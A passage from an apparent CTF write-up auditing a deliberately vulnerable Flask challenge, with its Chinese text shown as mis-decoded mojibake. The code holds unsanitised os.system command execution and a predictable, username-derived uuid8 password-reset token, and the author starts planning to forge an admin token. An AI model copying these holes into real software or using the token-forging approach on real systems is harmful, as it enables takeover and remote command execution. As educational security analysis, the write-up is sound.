</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;ç™»é™†æˆåŠŸï¼Œæ¬¢è¿!&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;dashboard&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;login.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/logout&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nd">@login_required</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;æˆåŠŸç™»å‡º&#39;</span><span class="p">,</span> <span class="s1">&#39;info&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/dashboard&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nd">@login_required</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dashboard</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;dashboard.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/forgot_password&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">forgot_password</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">email</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;email&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">email</span><span class="o">=</span><span class="n">email</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># é€‰å“ªä¸ªUUIDç‰ˆæœ¬å¥½å‘¢ï¼Œå¥½å¤´ç–¼ &gt;_&lt;</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># UUID v8å§ï¼Œçœ‹èµ·æ¥ç‰ˆæœ¬æ¯”è¾ƒæ–°</span>
</span></span><span class="line"><span class="cl">            <span class="n">token</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid8</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">padding</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">username</span><span class="p">)))</span> <span class="c1"># å¯ä»¥è‡ªå®šä¹‰å‚æ•°å—åŸæ¥ï¼Œé‚£æŠŠusernameæ”¾è¿›å»å§</span>
</span></span><span class="line"><span class="cl">            <span class="n">reset_token</span> <span class="o">=</span> <span class="n">PasswordResetToken</span><span class="p">(</span><span class="n">user_id</span><span class="o">=</span><span class="n">user</span><span class="o">.</span><span class="n">id</span><span class="p">,</span> <span class="n">token</span><span class="o">=</span><span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">reset_token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># TODOï¼šå†™ä¸€ä¸ªSMTPæœåŠ¡æŠŠtokenå‘å‡ºå»</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;å¯†ç æ¢å¤tokenå·²ç»å‘é€ï¼Œè¯·æ£€æŸ¥ä½ çš„é‚®ç®±&#39;</span><span class="p">,</span> <span class="s1">&#39;info&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;reset_password&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;æ²¡æœ‰æ‰¾åˆ°è¯¥é‚®ç®±å¯¹åº”çš„æ³¨å†Œè´¦æˆ·&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;forgot_password&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;forgot_password.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/reset_password&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reset_password</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">new_password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;new_password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">confirm_password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;confirm_password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">new_password</span> <span class="o">!=</span> <span class="n">confirm_password</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;å¯†ç ä¸åŒ¹é…&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;reset_password&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">reset_token</span> <span class="o">=</span> <span class="n">PasswordResetToken</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">token</span><span class="o">=</span><span class="n">token</span><span class="p">,</span> <span class="n">used</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">reset_token</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">reset_token</span><span class="o">.</span><span class="n">user_id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">user</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">generate_password_hash</span><span class="p">(</span><span class="n">new_password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">reset_token</span><span class="o">.</span><span class="n">used</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;æˆåŠŸé‡ç½®å¯†ç ï¼è¯·é‡æ–°ç™»å½•&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;æ— æ•ˆæˆ–è¿‡æœŸçš„token&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;reset_password&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;reset_password.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/execute_command&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nd">@login_required</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">execute_command</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">check_time_api</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;APIæ­»äº†å•¦ï¼Œéƒ½ä½ å®³çš„å•¦ã€‚&#34;</span><span class="p">,</span> <span class="s2">&#34;danger&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;dashboard&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;2066å¹´æ‰å®Œå·¥å“ˆï¼Œä½ å¯ä»¥ç©¿è¶Šåˆ°2066å¹´çœ‹çœ‹&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;dashboard&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">command</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;command&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="c1"># ä»€ä¹ˆï¼Ÿä½ è¯´å®‰å…¨ï¼Ÿä¸æ˜¯ï¼Œéƒ½è¯´äº†è¿˜æ²¡å®Œå·¥å‚¬ä»€ä¹ˆã€‚</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;execute_command&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;execute_command.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin/settings&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nd">@admin_required</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin_settings</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">new_api</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;time_api&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">user</span><span class="o">.</span><span class="n">time_api</span> <span class="o">=</span> <span class="n">new_api</span>
</span></span><span class="line"><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;æˆåŠŸæ›´æ–°APIï¼&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;admin_settings&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;admin_settings.html&#39;</span><span class="p">,</span> <span class="n">time_api</span><span class="o">=</span><span class="n">user</span><span class="o">.</span><span class="n">time_api</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç®€å•å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œå‘ç°ä»£ç å‘½ä»¤æ‰§è¡Œåœ¨/execute_commandï¼Œä½†æ˜¯éœ€è¦è¿‡<code>check_time_api()</code>å‡½æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_time_api</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">time_api</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">datetime_str</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;date&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">datetime_str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">datetime_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_time</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">fromisoformat</span><span class="p">(</span><span class="n">datetime_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">current_time</span><span class="o">.</span><span class="n">year</span> <span class="o">&gt;=</span> <span class="mi">2066</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¯¥å‡½æ•°é€šè¿‡è°ƒç”¨å½“å‰ç™»å½•ç”¨æˆ·çš„â€œæ—¶é—´ APIâ€æ¥å£ï¼Œè·å–è¿œç¨‹æ—¶é—´ï¼Œå¹¶åˆ¤æ–­è¯¥æ—¶é—´æ˜¯å¦åœ¨ 2066 å¹´æˆ–ä¹‹åã€‚æ‰€ä»¥çœ‹åˆ°æ›´æ–°apiçš„å‡½æ•°ï¼Œä½†æ˜¯å‘ç°éœ€è¦adminæƒé™ã€‚n</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin/settings&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nd">@admin_required</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin_settings</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">new_api</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;time_api&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">user</span><span class="o">.</span><span class="n">time_api</span> <span class="o">=</span> <span class="n">new_api</span>
</span></span><span class="line"><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;æˆåŠŸæ›´æ–°APIï¼&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;admin_settings&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;admin_settings.html&#39;</span><span class="p">,</span> <span class="n">time_api</span><span class="o">=</span><span class="n">user</span><span class="o">.</span><span class="n">time_api</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹åŠå¤©ï¼Œæ€ä¹ˆæåˆ°adminæƒé™ï¼Œå‘ç°è¿˜æœ‰å¿˜è®°å¯†ç ä¸é‡ç½®å¯†ç è¿™é‡Œå¯ä»¥åˆ©ç”¨ï¼Œä½†æ˜¯éœ€è¦tokenã€‚é‚£å°±éœ€è¦æƒ³åŠæ³•ä¼ªé€ tokenäº†ï¼Œä»”ç»†å®¡æºç ï¼Œè¿™é‡Œtokenæ˜¯ uuid.uuid8() å‡½æ•°ç”Ÿæˆçš„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/forgot_password&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">forgot_password</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">email</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;email&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">email</span><span class="o">=</span><span class="n">email</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># é€‰å“ªä¸ªUUIDç‰ˆæœ¬å¥½å‘¢ï¼Œå¥½å¤´ç–¼ &gt;_&lt;</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># UUID v8å§ï¼Œçœ‹èµ·æ¥ç‰ˆæœ¬æ¯”è¾ƒæ–°</span>
</span></span><span class="line"><span class="cl">            <span class="n">token</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid8</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">padding</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">username</span><span class="p">)))</span> <span class="c1"># å¯ä»¥è‡ªå®šä¹‰å‚æ•°å—åŸæ¥ï¼Œé‚£æŠŠusernameæ”¾è¿›å»å§</span>
</span></span><span class="line"><span class="cl">            <span class="n">reset_token</span> <span class="o">=</span> <span class="n">PasswordResetToken</span><span class="p">(</span><span class="n">user_id</span><span class="o">=</span><span class="n">user</span><span class="o">.</span><span class="n">id</span><span class="p">,</span> <span class="n">token</span><span class="o">=</span><span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">reset_token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># TODOï¼šå†™ä¸€ä¸ªSMTPæœåŠ¡æŠŠtokenå‘å‡ºå»</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;å¯†ç æ¢å¤tokenå·²ç»å‘é€ï¼Œè¯·æ£€æŸ¥ä½ çš„é‚®ç®±&#39;</span><span class="p">,</span> <span class="s1">&#39;info&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;reset_password&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;æ²¡æœ‰æ‰¾åˆ°è¯¥é‚®ç®±å¯¹åº”çš„æ³¨å†Œè´¦æˆ·&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;forgot_password&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;forgot_password.html&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘ä»¬å»ç¿»ä¸€ä¸‹uuid8çš„æ–‡æ¡£</p>
<p><a class="link" href="https://docs.python.org/3.14/library/uuid.html"  target="_blank" rel="noopener"
    >https://docs.python.org/3.14/library/uuid.html</a></p>
<p><img src="/p/2025-lilctf/image-20250905174518319.png"
	width="1579"
	height="412"
	srcset="/p/2025-lilctf/image-20250905174518319_hu_3ea5a8398c469f43.png 480w, /p/2025-lilctf/image-20250905174518319_hu_607ebca358e4c31d.png 1024w"
	loading="lazy"
	
		alt="image-20250905174518319"
	
	
		class="gallery-image" 
		data-flex-grow="383"
		data-flex-basis="919px"
	
></p>
